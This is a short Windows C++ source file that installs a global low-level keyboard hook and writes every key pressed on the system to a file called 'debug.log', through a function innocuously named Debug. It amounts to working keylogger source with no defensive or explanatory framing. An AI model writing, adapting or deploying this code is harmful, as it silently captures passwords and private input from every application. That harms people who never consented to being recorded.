#pragma comment(lib, "user32.lib")

#include "Hook.h"
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <fstream>

HHOOK keyboardHook;
KBDLLHOOKSTRUCT kbdStruct;

void Debug(const char text)
{
	std::ofstream file;
	file.open("debug.log", std::fstream::app);
	file << "Code: " << text << std::endl;
	file.close();
}

LRESULT __stdcall CallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		if (wParam == WM_KEYDOWN) 
		{
			char c = MapVirtualKey(kbdStruct.vkCode, 2);
			Debug(c);
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void Hook()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, CallbackKeyboard, NULL, 0);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}